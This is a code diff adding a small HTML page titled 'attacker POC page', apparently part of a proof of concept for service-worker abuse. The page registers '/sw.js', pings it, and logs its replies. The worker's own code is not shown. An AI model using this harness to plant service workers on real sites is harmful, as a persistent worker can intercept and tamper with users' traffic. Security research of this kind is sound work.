@@ -1,0 +1,27 @@
+<!doctype html>
+<html>
+  <body>
+    <h3>attacker POC page</h3>
+    <script>
+      // register the service worker (must be same origin as the page)
+      if ('serviceWorker' in navigator) {
+        navigator.serviceWorker.register('/sw.js').then(reg => {
+          console.log('[POC] sw registered', reg);
+          // if active controller exists, ping it to trigger any behavior
+          setTimeout(() => {
+            if (navigator.serviceWorker.controller) {
+              navigator.serviceWorker.controller.postMessage({cmd:'ping'});
+            }
+          }, 500);
+        }).catch(e => console.error('[POC] sw register failed', e));
+      } else {
+        console.log('[POC] no serviceWorker support');
+      }
+
+      // optional: listen for messages from sw (to confirm it's working)
+      navigator.serviceWorker.addEventListener('message', ev => {
+        console.log('[POC] got message from sw:', ev.data);
+      });
+    </script>
+  </body>
+</html>
